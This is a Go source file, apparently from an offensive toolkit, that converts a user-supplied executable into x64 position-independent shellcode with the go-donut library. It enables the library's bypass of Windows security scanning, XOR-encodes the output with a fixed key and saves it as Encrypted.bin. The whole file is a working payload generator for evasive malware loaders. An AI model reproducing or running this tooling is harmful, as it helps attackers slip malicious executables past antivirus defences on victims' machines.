package main

import (
	"Class7/help"
	"bufio"
	"fmt"
	"github.com/Binject/go-donut/donut"
	"github.com/fatih/color"
	"io/ioutil"
	"log"
	"os"
)

func Shellcode() {
	fmt.Print("Insert Path file > ")
	scan1 := bufio.NewScanner(os.Stdin)
	scan1.Scan()
	config := new(donut.DonutConfig)
	config.Arch = donut.X64
	config.Entropy = donut.DONUT_ENTROPY_DEFAULT
	config.InstType = donut.DONUT_INSTANCE_PIC
	config.Type = donut.DONUT_MODULE_EXE
	config.Bypass = 3
	config.Format = 1
	config.Compress = 1

	payload, err := donut.ShellcodeFromFile(scan1.Text(), config)
	if err != nil {
		log.Println(err)
	}

	leerbuffer, _ := ioutil.ReadAll(payload)
	encrypt := help.Xor(leerbuffer, 38)

	err = ioutil.WriteFile("Encrypted.bin", encrypt, 0644)
	fmt.Println(err)

	color.Blue("Shellcode generated successfully  ✅ > Encrypted.bin")

}

func main() {
	Shellcode()
}
